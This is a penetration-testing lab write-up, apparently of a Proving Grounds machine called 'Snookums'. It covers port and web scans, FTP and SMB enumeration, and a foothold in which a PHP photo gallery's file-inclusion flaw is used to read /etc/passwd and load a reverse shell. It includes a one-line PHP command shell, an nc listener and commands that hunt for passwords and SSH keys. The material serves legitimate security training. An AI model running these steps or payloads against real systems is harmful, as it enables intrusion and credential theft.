**Metadata**

- IP Address:  192.168.162.58
- Hostname: Snookums
- OS: 	Unix
- Found Credentials/Users:

Main Objectives:

Local.txt = 
Proof.txt = 

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 192.168.162.58 -oN /home/kali/ProvingGround/Snookums/nmap/full_tcp.nmap -oG /home/kali/ProvingGround/Snookums/nmap/full_tcp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-08 15:47 MST
Nmap scan report for 192.168.162.58
Host is up (0.070s latency).
Not shown: 65527 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
111/tcp   open  rpcbind     2-4 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
3306/tcp  open  mysql       MySQL (unauthorized)
33060/tcp open  mysqlx      MySQL X protocol listener
Service Info: Host: SNOOKUMS; OS: Unix

[+] Running: Nmap MEDIUM UDP (top 1000 + bounded)
[+] Command: nmap -sU -Pn -n --top-ports 1000 -T4 --open -sV --version-intensity 5 --max-retries 1 --host-timeout 20m 192.168.162.58 -oN /home/kali/ProvingGround/Snookums/nmap/medium_udp.nmap -oG /home/kali/ProvingGround/Snookums/nmap/medium_udp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-08 15:49 MST
Nmap scan report for 192.168.162.58
Host is up.
Skipping host 192.168.162.58 due to host timeout
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1200.35 seconds


```

2. Interesting Ports/Services

```
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
111/tcp   open  rpcbind     2-4 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
3306/tcp  open  mysql       MySQL (unauthorized)
33060/tcp open  mysqlx      MySQL X protocol listener
Service Info: Host: SNOOKUMS; OS: Unix
```

3. FTP Enumeration (Port 21)

```
FTP (21/tcp) Enumeration & Exploitation – OSCP Cheat Sheet

Metadata
IP: 192.168.162.58
Service: ftp
Version:   vsftpd 3.0.2

1. Initial Detection

21/tcp    open  ftp         vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.151
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status

Look for:

* FTP server type (vsftpd, ProFTPD, Pure-FTPd, FileZilla)
* Exact version numbers
* Anonymous login hints

---

3. Anonymous Login Test (ALWAYS)

ftp-anon: Anonymous FTP login allowed (FTP code 230)

After login:

ls
pwd
cd /
cd pub
binary
passive

Cannot run ls getting stuck.

--2026-01-08 19:21:09--  ftp://anonymous:*password*@192.168.162.58/
           => ‘192.168.162.58/.listing’
Connecting to 192.168.162.58:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... 

---

4. Anonymous Upload Test

Create a test file:

echo test > test.txt

Upload:

put test.txt

ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||46125|).


If upload succeeds:

* Check if directory maps to web root
* Attempt webshell upload
* Look for cron/script abuse

---

5. Download Everything (Loot First)

From local machine:

wget -r ftp://anonymous:anonymous@<IP>/

wget -r ftp://anonymous:anonymous@192.168.162.58       
--2026-01-08 19:21:09--  ftp://anonymous:*password*@192.168.162.58/
           => ‘192.168.162.58/.listing’
Connecting to 192.168.162.58:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... 

From ftp client:

ftp> prompt
Interactive mode off.
ftp> mget *
ftp: Can't connect to `192.168.162.58:15497': Connection timed out

Look for:

* Credentials
* .bak / .old / .zip / .tar.gz
* Source code
```

3. SSH Enumeration (Port 22)

```
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)
|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)
|_  256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)
```

4. Web Enumeration (Port 80)

```
+ Server: Apache/2.4.6 (CentOS) PHP/5.4.16
  
Site Visit Observations:
1. Simple PHP Photo Gallery v0.8
2. /images/examples directory
3. Uses php

80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Simple PHP Photo Gallery
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16

[+] Running: Gobuster BASIC (80)
[+] Command: gobuster dir -u http://192.168.162.58:80 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Snookums/gobuster/Snookums_192.168.162.58_80_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.58:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 206]
/cgi-bin/             (Status: 403) [Size: 210]
/css                  (Status: 301) [Size: 234] [--> http://192.168.162.58/css/]
/.htpasswd            (Status: 403) [Size: 211]
/.htaccess            (Status: 403) [Size: 211]
/images               (Status: 301) [Size: 237] [--> http://192.168.162.58/images/]
/index.php            (Status: 200) [Size: 2730]
/js                   (Status: 301) [Size: 233] [--> http://192.168.162.58/js/]
/photos               (Status: 301) [Size: 237] [--> http://192.168.162.58/photos/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished

[+] Running: Gobuster ADVANCED (80)
[+] Command: gobuster dir -u http://192.168.162.58:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Snookums/gobuster/Snookums_192.168.162.58_80_dir_advanced.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.58:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 237] [--> http://192.168.162.58/images/]
/photos               (Status: 301) [Size: 237] [--> http://192.168.162.58/photos/]
/css                  (Status: 301) [Size: 234] [--> http://192.168.162.58/css/]
/js                   (Status: 301) [Size: 233] [--> http://192.168.162.58/js/]
Progress: 220459 / 220558 (99.96%)
Progress: 220558 / 220558 (100.00%)===============================================================
Finished

[+] Running: Gobuster FILE search (80)
[+] Command: gobuster dir -u http://192.168.162.58:80 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -o /home/kali/ProvingGround/Snookums/gobuster/Snookums_192.168.162.58_80_files.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.58:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,asp,jsp,html,txt,zip,tar,aspx,bak,old,tar.gz
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 206]
/.hta.jsp             (Status: 403) [Size: 210]
/.hta.html            (Status: 403) [Size: 211]
/.hta.php             (Status: 403) [Size: 210]
/.hta.zip             (Status: 403) [Size: 210]
/.hta.aspx            (Status: 403) [Size: 211]
/.hta.tar             (Status: 403) [Size: 210]
/.hta.asp             (Status: 403) [Size: 210]
/.hta.txt             (Status: 403) [Size: 210]
/.hta.tar.gz          (Status: 403) [Size: 213]
/.htaccess.aspx       (Status: 403) [Size: 216]
/.hta.old             (Status: 403) [Size: 210]
/.htaccess.php        (Status: 403) [Size: 215]
/.htaccess.asp        (Status: 403) [Size: 215]
/.htaccess            (Status: 403) [Size: 211]
/.hta.bak             (Status: 403) [Size: 210]
/.htaccess.old        (Status: 403) [Size: 215]
/.htaccess.bak        (Status: 403) [Size: 215]
/.htaccess.tar.gz     (Status: 403) [Size: 218]
/.htaccess.jsp        (Status: 403) [Size: 215]
/.htaccess.zip        (Status: 403) [Size: 215]
/.htaccess.html       (Status: 403) [Size: 216]
/.htpasswd.asp        (Status: 403) [Size: 215]
/.htpasswd.html       (Status: 403) [Size: 216]
/.htpasswd.php        (Status: 403) [Size: 215]
/.htpasswd            (Status: 403) [Size: 211]
/.htpasswd.txt        (Status: 403) [Size: 215]
/.htpasswd.jsp        (Status: 403) [Size: 215]
/.htpasswd.tar        (Status: 403) [Size: 215]
/.htpasswd.aspx       (Status: 403) [Size: 216]
/.htpasswd.old        (Status: 403) [Size: 215]
/.htpasswd.zip        (Status: 403) [Size: 215]
/.htaccess.tar        (Status: 403) [Size: 215]
/.htpasswd.bak        (Status: 403) [Size: 215]
/.htaccess.txt        (Status: 403) [Size: 215]
/.htpasswd.tar.gz     (Status: 403) [Size: 218]
/cgi-bin/.html        (Status: 403) [Size: 215]
/cgi-bin/             (Status: 403) [Size: 210]
/css                  (Status: 301) [Size: 234] [--> http://192.168.162.58/css/]
/db.php               (Status: 200) [Size: 0]
/functions.php        (Status: 200) [Size: 0]
/image.php            (Status: 200) [Size: 1508]
/images               (Status: 301) [Size: 237] [--> http://192.168.162.58/images/]
/index.php            (Status: 200) [Size: 2730]
/index.php            (Status: 200) [Size: 2730]
/js                   (Status: 301) [Size: 233] [--> http://192.168.162.58/js/]
/license.txt          (Status: 200) [Size: 18511]
/photos               (Status: 301) [Size: 237] [--> http://192.168.162.58/photos/]
/README.txt           (Status: 200) [Size: 4041]
Progress: 55146 / 55356 (99.62%)
Progress: 55356 / 55356 (100.00%)===============================================================
Finished

[+] Running: Gobuster LOWERCASE dir (80)
[+] Command: gobuster dir -u http://192.168.162.58:80 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Snookums/gobuster/Snookums_192.168.162.58_80_dir_lowercase.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.58:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 237] [--> http://192.168.162.58/images/]
/photos               (Status: 301) [Size: 237] [--> http://192.168.162.58/photos/]
/css                  (Status: 301) [Size: 234] [--> http://192.168.162.58/css/]
/js                   (Status: 301) [Size: 233] [--> http://192.168.162.58/js/]
Progress: 207576 / 207641 (99.97%)
Progress: 207641 / 207641 (100.00%)===============================================================
Finished
========

[+] Nikto scan on HTTP ports: 80
[+] Running: Nikto (80)
[+] Command: nikto -h http://192.168.162.58:80 -output /home/kali/ProvingGround/Snookums/web/192.168.162.58_80/nikto.txt -Format txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.162.58
+ Target Hostname:    192.168.162.58
+ Target Port:        80
+ Start Time:         2026-01-08 16:22:45 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS) PHP/5.4.16
+ /: Retrieved x-powered-by header: PHP/5.4.16.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /images: IP address found in the 'location' header. The IP is "127.0.0.2". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.0.2". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ PHP/5.4.16 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.4 - PHP 3/4/5 and 7.0 are End of Life products without support.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /db.php: This might be interesting: has been seen in web logs from an unknown scanner.
+ /icons/: Directory indexing found.
+ /images/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /license.txt: License file found may identify site software.
+ 8908 requests: 0 error(s) and 20 item(s) reported on remote host
+ End Time:           2026-01-08 16:34:30 (GMT-7) (705 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

4. RPC Port 111 Enumeration 

```
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind

rpcinfo -p 192.168.162.58

rpcclient -U "username%password" 192.168.162.58/

rpcclient -U "username%password" 192.168.162.58/ -c 'stop service_name'
```

5. SMB Port 139, 445 Enumeration

```
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)

| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.4)
|   Computer name: snookums
|   NetBIOS computer name: SNOOKUMS\x00
|   Domain name: \x00
|   FQDN: snookums
|_  System time: 2026-01-08T18:09:32-05:00
| smb2-time: 
|   date: 2026-01-08T23:09:33
|_  start_date: N/A


smbclient -L //192.168.162.58             
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.10.4)
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        SAMBA    

smbmap -H 192.168.162.58    
[+] IP: 192.168.162.58:445      Name: 192.168.162.58            Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.10.4)
              

smbclient //192.168.162.58/IPC$ -N    
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
smb: \> dir



```

6. MySQL (Port 3306 and 33060)

```
3306/tcp  open  mysql       MySQL (unauthorized)
33060/tcp open  mysqlx      MySQL X protocol listener

```

7. Possible Exploits

```
http://192.168.162.58/image.php?img=../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin polkitd:x:999:998:User for polkitd:/:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin chrony:x:998:996::/var/lib/chrony:/sbin/nologin michael:x:1000:1000:Michael:/home/michael:/bin/bash apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin

/etc/hostname
snookums
/proc/version
Linux version 3.10.0-1127.10.1.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-39) (GCC) ) #1 SMP Wed Jun 3 14:28:03 UTC 2020
/etc/issue
\S Kernel \r on an \m


https://github.com/beauknowstech/SimplePHPGal-RCE.py
SIm

https://www.exploit-db.com/exploits/48424

```

8. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps:

-  Navigated to http://192.168.162.58/image.php?img=../../../../../etc/passwd and first verified LFI.

![[Pasted image 20260111154656.png]]

- Created test php shell.

```
echo '<?=system($_GET['cmd']);?>' > cmd.php
python -m http.server 80

```

- Confirmed it there was an LFI as mentioned in the 48424 exploit DB writeup.

![[Pasted image 20260111155303.png]]

- Using the https://github.com/pentestmonkey/php-reverse-shell created reverse shell on my host.

```
nano rev.php //copy in and edit php reverse shell
python -m http.server 80
```

- Setup nc listener. Used a port that I thought they might listening on based open ports.

```
nc -nvlp 445
```

- Executed reverse shell using RFI vulnerability by visiting.

![[Pasted image 20260111160037.png]]

- Received reverse shell as apache. 

![[Pasted image 20260111160155.png]]


2. Shell Access

```
# Linxu shell upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**Post-Exploitation**

1. Basic System Info

```
# Linux
hostname


uname -a


cat /etc/os-release 2>/dev/null


env



echo $PATH


find / -writable -type d 2>/dev/null | head


find / -perm -4000 -type f 2>/dev/null

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

/usr/bin/su

cat /etc/crontab 2>/dev/null

ls -la /etc/cron.*


crontab -l 2>/dev/null

getcap -r / 2>/dev/null


ls -l /etc/shadow



ls -la /  


```

2. User Enumeration

```
# Linux
whoami


id


cat /etc/passwd


ls -la /home


sudo -l



```

3. Network Information

```
# Linux
ss -tulwn

netstat -tulnp 2>/dev/null
```

4. Software, Service, and Process Information

```
# Linux
dpkg -l 
ps aux
ps -ef

```

4. Loot files.
```
# Linux

grep -R "password" /etc 2>/dev/null | head

ls -la /var/www 2>/dev/null

find /home -name "*.txt" 2>/dev/null


find /home -type f -name "*history*" 2>/dev/null


find /home -type f -name "id_rsa" -o -name "id_*" 2>/dev/null


grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head

find / -name "*.bak" -o -name "*~" 2>/dev/null | head


```

5. Automated Enumeration

```




```
5. Possible PE Paths

```



```

**Privilege Escalation**

1. PE Steps

```

```

2. Notes

```

```

